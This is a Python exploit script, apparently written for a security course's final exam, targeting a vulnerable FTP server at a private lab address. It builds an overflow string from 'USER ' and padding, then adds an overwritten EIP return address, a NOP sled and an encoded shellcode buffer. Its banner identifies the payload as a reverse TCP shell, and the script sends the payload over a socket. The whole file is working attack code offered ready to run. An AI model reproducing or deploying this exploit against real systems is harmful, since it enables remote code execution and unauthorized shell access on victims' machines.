import socket
#Litt, kenyon final 
#question 1 exploit with ftp server

ip = "192.168.202.79"
port = 21
EIP= "\x07\xF5\x3D\x75"    # addr is 753DF507
#EIP = "BBBB"
base_jnk = "USER "
add_jnk = "A"*230 # found using generic fuzzer written before

buf =  ""
buf += "\xbe\xb5\x29\x36\x97\xd9\xc5\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x56\x83\xc7\x04\x31\x77\x0f\x03\x77\xba\xcb"
buf += "\xc3\x6b\x2c\x89\x2c\x94\xac\xee\xa5\x71\x9d\x2e\xd1"
buf += "\xf2\x8d\x9e\x91\x57\x21\x54\xf7\x43\xb2\x18\xd0\x64"
buf += "\x73\x96\x06\x4a\x84\x8b\x7b\xcd\x06\xd6\xaf\x2d\x37"
buf += "\x19\xa2\x2c\x70\x44\x4f\x7c\x29\x02\xe2\x91\x5e\x5e"
buf += "\x3f\x19\x2c\x4e\x47\xfe\xe4\x71\x66\x51\x7f\x28\xa8"
buf += "\x53\xac\x40\xe1\x4b\xb1\x6d\xbb\xe0\x01\x19\x3a\x21"
buf += "\x58\xe2\x91\x0c\x55\x11\xeb\x49\x51\xca\x9e\xa3\xa2"
buf += "\x77\x99\x77\xd9\xa3\x2c\x6c\x79\x27\x96\x48\x78\xe4"
buf += "\x41\x1a\x76\x41\x05\x44\x9a\x54\xca\xfe\xa6\xdd\xed"
buf += "\xd0\x2f\xa5\xc9\xf4\x74\x7d\x73\xac\xd0\xd0\x8c\xae"
buf += "\xbb\x8d\x28\xa4\x51\xd9\x40\xe7\x3d\x2e\x69\x18\xbd"
buf += "\x38\xfa\x6b\x8f\xe7\x50\xe4\xa3\x60\x7f\xf3\xb2\x67"
buf += "\x80\x2b\x7c\xe7\x7e\xcc\x7c\x21\x45\x98\x2c\x59\x6c"
buf += "\xa1\xa7\x99\x91\x74\x5d\x90\x05\xb7\x09\x6e\xdb\x5f"
buf += "\x4b\x6f\xf5\xc3\xc2\x89\xa5\xab\x84\x05\x06\x1c\x64"
buf += "\xf6\xee\x76\x6b\x29\x0e\x79\xa6\x42\xa5\x96\x1e\x3a"
buf += "\x52\x0e\x3b\xb0\xc3\xcf\x96\xbc\xc4\x44\x12\x40\x8a"
buf += "\xac\x57\x52\xfb\xca\x97\xaa\xfc\x7e\x97\xc0\xf8\x28"
buf += "\xc0\x7c\x03\x0c\x26\x23\xfc\x7b\x35\x24\x02\xfa\x0f"
buf += "\x5e\x35\x68\x2f\x08\x3a\x7c\xaf\xc8\x6c\x16\xaf\xa0"
buf += "\xc8\x42\xfc\xd5\x16\x5f\x91\x45\x83\x60\xc3\x3a\x04"
buf += "\x09\xe9\x65\x62\x96\x12\x40\xf0\xd1\xec\x16\xdf\x79"
buf += "\x84\xe8\x5f\x7a\x54\x83\x5f\x2a\x3c\x58\x4f\xc5\x8c"
buf += "\xa1\x5a\x8e\x84\x28\x0b\x7c\x35\x2c\x06\x20\xeb\x2d"
buf += "\xa5\xf9\x1c\x57\xc6\xfe\xdd\xa8\xce\x9a\xde\xa8\xee"
buf += "\x9c\xe3\x7e\xd7\xea\x22\x43\x6c\xe4\x11\xe6\xc5\x6f"
buf += "\x59\xb4\x16\xba"
mal = "d"*20
nopsled = "\x90"*24
mal_str = base_jnk + add_jnk + EIP + nopsled+  buf  +"\r\n"


def main():
	print("Question 1 exploit - reverse tcp shell with custom fuzzer")
	print("[#]")
	print("[Vuln server] {}:{}").format(ip,port)
	print(" JUNK STR:{}").format(mal_str)
	print("[...] Connecting to server")
	
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.settimeout(3)
	sock.connect((ip,port))
	print("[RESP:] {}").format(sock.recv(2000))
	print("[SEND:] Bad str {}").format(mal_str)
	sock.send(mal_str)
	print("[RESP:] {}").format(sock.recv(2000))
	sock.close()
main()

